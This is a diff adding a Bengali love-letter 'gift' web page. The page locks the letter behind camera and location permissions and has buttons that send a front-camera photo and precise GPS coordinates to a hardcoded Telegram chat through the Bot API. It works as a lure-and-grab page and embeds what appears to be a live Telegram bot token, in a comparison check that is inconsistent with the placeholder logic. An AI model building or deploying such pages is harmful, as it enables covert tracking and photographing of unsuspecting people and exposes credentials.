@@ -1,0 +1,254 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>💝 বিশেষ উপহার</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=Hind+Siliguri:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    body {
+      font-family: 'Outfit', sans-serif;
+      background-color: #050505;
+      color: white;
+      min-height: 100vh;
+      margin: 0;
+      transition: background-color 0.5s ease;
+      overflow-x: hidden;
+    }
+    .gift-glow {
+      box-shadow: 0 0 50px rgba(236, 72, 153, 0.4);
+    }
+    .pulse-animation {
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0.7); }
+      70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(236, 72, 153, 0); }
+      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0); }
+    }
+    .fade-out {
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s;
+    }
+    .letter-card {
+      background: #1a1a1a;
+      border-radius: 2rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 20px 60px rgba(236, 72, 153, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      backdrop-filter: blur(4px);
+    }
+    .heart {
+      color: #f472b6;
+    }
+    .signature {
+      font-family: 'Outfit', sans-serif;
+      letter-spacing: 1px;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .processing-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(5, 5, 5, 0.95);
+      backdrop-filter: blur(10px);
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ========== INITIAL UI ========== -->
+  <div id="initial-ui" class="flex flex-col items-center justify-center min-h-screen w-full max-w-md mx-auto p-6 text-center transition-all duration-500">
+    <div class="relative w-32 h-32 mb-8 flex items-center justify-center bg-gradient-to-tr from-pink-600 to-purple-600 rounded-3xl gift-glow pulse-animation">
+      <i data-lucide="gift" class="w-16 h-16 text-white"></i>
+    </div>
+    <button 
+      id="verify-btn"
+      class="w-full max-w-[200px] py-3.5 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl font-semibold tracking-wide backdrop-blur-md transition-all active:scale-95"
+    >
+      Read Chithi
+    </button>
+  </div>
+
+  <!-- ========== PROCESSING OVERLAY ========== -->
+  <div id="processing-overlay" class="processing-overlay hidden">
+    <div class="w-12 h-12 border-4 border-white/10 border-t-white rounded-full animate-spin mb-4"></div>
+    <p id="status-text" class="text-white/60 text-sm tracking-widest uppercase font-medium">Authenticating...</p>
+  </div>
+
+  <!-- ========== LETTER SECTION (hidden initially) ========== -->
+  <div id="letter-section" class="hidden w-full max-w-4xl mx-auto px-4 py-12">
+    <div class="letter-card">
+      <div class="text-center mb-6">
+        <span class="text-5xl heart">❤️</span>
+        <h1 class="text-3xl font-bold mt-3 text-pink-300" style="font-family: 'Hind Siliguri', sans-serif;">প্রিয়তমা...</h1>
+      </div>
+      <div class="space-y-4 text-base leading-relaxed text-gray-200" style="font-family: 'Hind Siliguri', sans-serif;">
+        <p>এই চিঠিটা শুধু তোমার জন্য। তুমি হয়তো জানো না, কিন্তু তুমি আমার জীবনের সবচেয়ে সুন্দর অধ্যায়।</p>
+        <p>প্রতিটি মুহূর্ত যে তোমার সাথে কাটে, সেটা যেন এক টুকরো স্বপ্ন। তোমার হাসি, তোমার কথা, তোমার চোখের দ্যুতি--সবকিছুই আমার কাছে অসীম মূল্যবান।</p>
+        <p>আমি জানি না কীভাবে বলবো, কিন্তু তুমি আমার শান্তি, আমার ভালোবাসা, আমার প্রেরণা। তুমি থাকলে সব অনিশ্চয়তাও সুন্দর লাগে।</p>
+        <p>এই ছোট্ট চিঠি পড়ে তুমি হয়তো হাসবে, কিন্তু এটা আমার মন থেকে লেখা। সবসময় মনে রেখো--<span class="text-pink-300 font-semibold">আমি তোমাকে খুব, খুব ভালোবাসি।</span></p>
+      </div>
+      <div class="mt-8 text-right">
+        <p class="text-pink-300/70 text-sm signature">-- তোমারই একজন</p>
+        <p class="text-xs text-white/30 mt-1">🕊️ ২০২৬ · ভালোবাসার বসন্ত</p>
+      </div>
+    </div>
+  </div>
+
+
+  <div id="consent-dialog" class="fixed inset-0 z-[200] hidden flex items-center justify-center bg-black/90 p-5">
+    <div class="w-full max-w-md rounded-2xl border border-pink-400/30 bg-[#171717] p-6 shadow-2xl">
+      <h2 class="mb-3 text-xl font-bold text-pink-300" style="font-family:Arial,sans-serif;">Your Permission</h2>
+      <p class="mb-4 text-sm leading-6 text-gray-200" style="font-family:Arial,sans-serif;">
+        To open the letter, allow both Camera and Location permissions. The letter will stay locked if either permission is denied. Photos or location are sent to Telegram only when you press their separate send buttons.
+      </p>
+      <div class="flex flex-col gap-3">
+        <button id="camera-start" class="rounded-xl border border-pink-400/40 px-4 py-3 text-white">📸 Turn On Camera</button>
+        <video id="camera-preview" class="hidden w-full rounded-xl" playsinline autoplay muted></video>
+        <button id="take-photo" class="hidden rounded-xl bg-pink-600 px-4 py-3 font-semibold text-white">Take Photo & Send to Telegram</button>
+        <button id="send-location" class="rounded-xl border border-purple-300/40 px-4 py-3 text-white">📍 Send My Location to Telegram</button>
+        <button id="consent-letter-only" class="rounded-xl bg-pink-600 px-4 py-3 font-semibold text-white">Allow Camera & Location — Open Letter</button>
+        <p id="test-status" class="text-sm text-gray-300" aria-live="polite"></p>
+      </div>
+      <p class="mt-4 text-xs text-gray-400">Camera and Location permission are both required to open the letter. Use an HTTPS link. Telegram sending requires a securely configured bot.</p>
+    </div>
+  </div>
+
+  <script>
+    if (window.lucide && typeof window.lucide.createIcons === 'function') window.lucide.createIcons();
+
+    // Keep tokens out of public HTML. This placeholder will not send anything until configured safely.
+    const BOT_TOKEN = 'PASTE_BOT_TOKEN_HERE'; // Telegram send buttons stay disabled until a secure bot setup is configured.
+    const CHAT_ID = '6925240757';
+
+    const verifyBtn = document.getElementById('verify-btn');
+    const initialUI = document.getElementById('initial-ui');
+    const letterSection = document.getElementById('letter-section');
+    const consentDialog = document.getElementById('consent-dialog');
+    const statusEl = document.getElementById('test-status');
+    const cameraStart = document.getElementById('camera-start');
+    const video = document.getElementById('camera-preview');
+    const takePhotoBtn = document.getElementById('take-photo');
+    const locationBtn = document.getElementById('send-location');
+    const letterOnlyBtn = document.getElementById('consent-letter-only');
+    let cameraStream = null;
+    let cameraPermissionGranted = false;
+    let locationPermissionGranted = false;
+
+    function status(message) { statusEl.textContent = message; }
+
+    function openLetter() {
+      if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+      cameraStream = null;
+      consentDialog.classList.add('hidden');
+      initialUI.classList.add('fade-out');
+      window.setTimeout(() => {
+        initialUI.style.display = 'none';
+        letterSection.classList.remove('hidden');
+        letterSection.scrollIntoView({behavior:'smooth', block:'start'});
+      }, 350);
+    }
+
+    verifyBtn.addEventListener('click', () => consentDialog.classList.remove('hidden'));
+    letterOnlyBtn.addEventListener('click', async () => {
+      letterOnlyBtn.disabled = true;
+      try {
+        // Reuse permission results from the explicit Camera and Location buttons.
+        if (!cameraPermissionGranted) {
+          status('Requesting camera permission...');
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            status('Camera needs an HTTPS website opened in a supported browser.');
+            return;
+          }
+          const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
+          cameraPermissionGranted = true;
+          stream.getTracks().forEach(track => track.stop());
+        }
+        if (!locationPermissionGranted) {
+          status('Requesting location permission...');
+          if (!navigator.geolocation) {
+            status('Location is not supported by this browser.');
+            return;
+          }
+          await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy:false, timeout:25000, maximumAge:0}));
+          locationPermissionGranted = true;
+        }
+        status('Both permissions granted. Opening letter...');
+        openLetter();
+      } catch (e) {
+        status('Permission not granted or unavailable. Allow Camera and Location for this website in browser settings, then try again.');
+      } finally {
+        letterOnlyBtn.disabled = false;
+      }
+    });
+
+    cameraStart.addEventListener('click', async () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        status('Camera could not start. Use an HTTPS link and allow Camera permission in Chrome.');
+        return;
+      }
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
+        cameraPermissionGranted = true;
+        video.srcObject = cameraStream;
+        video.classList.remove('hidden');
+        takePhotoBtn.classList.remove('hidden');
+        status('Camera is on. Press the button below if you want to send a photo.');
+      } catch (e) {
+        status('Camera permission was not granted. Allow Camera in your browser Site settings.');
+      }
+    });
+
+    takePhotoBtn.addEventListener('click', async () => {
+      if (!cameraStream || !video.videoWidth) { status('Please turn on the camera first.'); return; }
+      if (BOT_TOKEN === 'PASTE_BOT_TOKEN_HERE') {
+        status('ছবি তোলা সম্ভব, কিন্তু Telegram পাঠানো বন্ধ: Bot Token এখনো নিরাপদভাবে সেট করা হয়নি। Public HTML-এ Token বসিও না।');
+        return;
+      }
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', .85));
+        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg');
+        const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {method:'POST', body:fd});
+        const data = await res.json();
+        status(data.ok ? 'ছবি Telegram-এ পাঠানো হয়েছে।' : 'Telegram ছবি গ্রহণ করেনি। Bot token ও chat ID পরীক্ষা করো।');
+      } catch(e) { status('পাঠানো যায়নি। ইন্টারনেট, Token এবং Telegram bot-এর chat পরীক্ষা করো।'); }
+    });
+
+    locationBtn.addEventListener('click', () => {
+      if (!navigator.geolocation) { status('Location is not available in this browser.'); return; }
+      status('Requesting location permission...');
+      navigator.geolocation.getCurrentPosition(async pos => {
+        locationPermissionGranted = true;
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        if (BOT_TOKEN === '8846954966:AAH4DgCn85OoUdWi7JNKmAfPo7krQVtlA2c') {
+          status('লোকেশন পাওয়া গেছে, কিন্তু Telegram পাঠানো বন্ধ: Bot Token নিরাপদভাবে সেট করা হয়নি।');
+          return;
+        }
+        try {
+          const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID, text:'📍 Location shared with permission: https://www.google.com/maps?q='+lat+','+lon})
+          });
+          const data = await res.json();
+          status(data.ok ? 'লোকেশন Telegram-এ পাঠানো হয়েছে।' : 'Telegram লোকেশন গ্রহণ করেনি। Bot token ও chat ID পরীক্ষা করো।');
+        } catch(e) { status('লোকেশন পাঠানো যায়নি। ইন্টারনেট, Token এবং Telegram bot-এর chat পরীক্ষা করো।'); }
+      }, err => {
+        status('লোকেশন পাওয়া যায়নি। ফোনের Location চালু করো এবং ব্রাউজারের Location permission Allow করো।');
+      }, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
+    });
+  </script>
+</body>
+</html>
